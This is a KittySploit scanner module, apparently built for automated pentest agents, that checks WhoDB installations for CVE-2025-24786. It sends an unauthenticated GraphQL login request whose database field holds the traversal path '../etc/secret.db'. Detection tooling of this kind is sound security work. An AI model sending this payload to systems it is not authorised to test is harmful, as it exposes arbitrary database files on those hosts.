#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WhoDB contains a path traversal caused by lack of validation when opening database files, letting unauthentica."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WhoDB < 0.45.0 - Path Traversal Detection',
        'description': 'WhoDB contains a path traversal caused by lack of validation when opening database files, letting unauthenticated attackers access arbitrary Sqlite3 databases on the host system, exploit requires attacker to manipulate database filename input.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'whodb', 'lfi', 'pathtraversal', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/clidey/whodb',
            'https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-24786',
        ],
        'cve': 'CVE-2025-24786',
    }

    def run(self):
        path = '/api/query'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"operationName":"Login","variables":{"credentials":{"Type":"Sqlite3","Hostname":"","Database":"../etc/secret.db","Username":"","Password":"","Advanced":[]}},"query":"mutation Login($credentials: LoginCredentials!) {\\n  Login(credentials: $credentials) {\\n    Status\\n    __typename\\n  }\\n}"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"Status":true', '"StatusResponse"',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WhoDB < 0.45.0 - Path Traversal detected', path=path)
            return True
        return False

